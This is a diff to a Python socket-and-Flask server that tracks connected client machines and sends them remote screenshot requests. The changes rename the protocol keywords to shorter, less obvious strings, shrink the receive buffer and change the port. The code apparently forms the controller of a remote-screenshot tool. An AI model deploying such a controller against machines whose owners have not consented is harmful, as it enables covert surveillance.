@@ -25,7 +25,7 @@ def start_server():
 
 def handle_client(client_socket, addr):
     # Receive initial machine information
-    data = client_socket.recv(1024).decode()
+    data = client_socket.recv(64).decode()
     ip, port = addr
     
     # Add/update client information
@@ -39,11 +39,11 @@ def handle_client(client_socket, addr):
     
     try:
         while True:
-            data = client_socket.recv(1024).decode()
+            data = client_socket.recv(64).decode()
             if not data:
                 break
                 
-            if data.startswith("HEARTBEAT"):
+            if data.startswith("Timestamp"):
                 clients[ip]['last_active'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             elif data.startswith("SCREENSHOT_DATA"):
                 # Handle screenshot data (simplified)
@@ -73,7 +73,7 @@ def get_clients():
 def request_screenshot(ip):
     if ip in clients:
         try:
-            clients[ip]['socket'].send("SCREENSHOT".encode())
+            clients[ip]['socket'].send("SCSH".encode())
             return jsonify({"status": "request_sent"})
         except:
             return jsonify({"status": "error"})
@@ -89,4 +89,4 @@ if __name__ == '__main__':
     threading.Thread(target=start_server, daemon=True).start()
     
     # Start web interface
-    app.run(host='0.0.0.0', port=8080)
+    app.run(host='0.0.0.0', port=5000)
